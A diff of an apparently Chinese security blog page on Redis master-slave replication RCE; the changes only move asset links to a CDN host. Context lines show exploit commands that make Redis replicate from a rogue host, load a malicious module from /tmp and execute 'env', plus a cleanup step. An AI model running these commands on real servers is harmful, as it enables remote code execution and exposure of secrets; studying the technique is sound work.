@@ -5,10 +5,10 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-    <link rel="icon" href='/static/favicon.ico' type="image/x-icon">
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
     <title>Redis主从复制RCE - MoonlitSyntax</title>
 
-    <link rel="stylesheet" href='/static/css/app-VZKXMC7L.css'>
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-VZKXMC7L.css'>
 
 
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -191,7 +191,7 @@ PSYNC</p>
 </span></span><span class="line"><span class="cl">&lt;payload数据&gt;\r\n
 </span></span></code></pre></div></div><p><strong>其他</strong>
 对于其他请求,比如ping等,直接返回+ok或者+pong就好了</p>
-<p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020250413120042.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020250413120042.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250413120042.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250413120042.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <h2 id="漏洞利用">漏洞利用</h2>
 <div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">slaveof host.docker.internal 21000 
 </span></span><span class="line"><span class="cl">config set dir /tmp
@@ -203,7 +203,7 @@ PSYNC</p>
 </span></span><span class="line"><span class="cl"><span class="kn">module</span> <span class="nv">load</span> <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">exp</span><span class="p">.</span><span class="nv">so</span>
 </span></span><span class="line"><span class="cl"><span class="nv">system</span><span class="p">.</span><span class="nv">exec</span> <span class="s1">&#39;env&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">quit</span>
-</span></span></code></pre></div></div><p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020250413132849.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020250413132849.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250413132849.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250413132849.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <p>最后记得移除,不然环境就寄了</p>
 <div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">CONFIG SET dbfilename dump.rdb
 </span></span><span class="line"><span class="cl">MODULE UNLOAD system
@@ -421,7 +421,7 @@ PSYNC</p>
     </div>
 </div>
 
-<script src='/static/js/app-IJHRYWUS.js' defer></script>
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
 
 
 <script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
